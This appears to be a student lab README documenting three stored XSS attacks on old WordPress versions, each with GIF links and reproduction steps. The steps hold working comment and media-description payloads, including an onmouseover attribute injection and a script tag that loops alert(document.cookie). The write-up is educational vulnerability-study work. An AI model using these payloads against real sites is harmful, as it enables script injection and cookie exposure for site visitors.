# README

Time Spent: 6 hours in total

Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

XXS

  - [ ] Summary: 
  
      I am using XSS with WP 4.2, which was fixed in version 4.2.1.
  - [ ] GIF Walkthrough:![](https://i.imgur.com/xslxj31.gif)
  - [ ] Steps to Recreate:
  42f60001cad9
     You have to comment on a post and insert the following into a comment: 
     
     <a title='x onmouseover=alert(unescape(/hello%20world/.source))          style=position:absolute;left:0;top:0;width:5000px;height:5000px <You will then insert 64,000 of a character and hit comment>
  - [ ] Affected Source Code: 
        None
  
  
XXS

  - [ ] Summary:
  
  I am using XSS with WP 4.2, which was fixed in version 4.7.3.
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/uDAam90.gif)
  - [ ] Steps to Recreate:
  
        1. Create a media post 
        
        2. Add  "filename <script>alert("Exploit 3 Successful");</script>" to the desciption (include the quotes)
        
        3. Then click view attachment page and the alert box will pop up
  - [ ] Affected Source Code:
        None
  
  
  XXS

  - [ ] Summary:
 
  I am using XSS with WP 4.0, which was fixed in version 4.2.
  - [ ] GIF Walkthrough:![](https://i.imgur.com/oEVvcpm.gif)
  - [ ] Steps to Recreate:
  
  You post the following into a comment on a post: <script>while(1){alert(document.cookie);}<script>
  - [ ] Affected Source Code:
        None




## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Figuring out how to make a gif able to upload was difficult

## License

    Copyright [2018] [Anna Noe]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
